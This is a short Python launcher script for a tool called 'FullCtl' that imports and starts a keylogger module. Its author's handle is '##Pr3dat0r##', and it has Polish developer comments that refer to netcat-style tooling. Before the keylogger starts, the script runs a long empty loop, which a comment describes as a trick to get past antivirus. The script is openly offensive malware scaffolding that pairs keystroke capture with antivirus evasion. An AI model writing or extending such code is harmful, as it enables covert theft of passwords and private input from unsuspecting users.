#!/usr/bin/python


from src.keylogger import *

class Engine():
    def __init__(self):
        self.author = "##Pr3dat0r##"
        self.name = "##FullCtl##"
        self.k=Keylogger()

    def main(self):
        print (self.author+" presents: "+self.name+ " softwere.")
        self.k.keylogger()

    def loop(self):
        #simple trick to get past antivirus
        a = 0
        for something in range(0,10000000):
            a+=something



#gdy funkcji pojawi sie wiecej zostanie wprowadzony podzial na parametry
#opt,args -> jak w netcat.py from BHpython repo
if __name__=="__main__":
    eng=Engine()
    eng.loop()
    eng.main()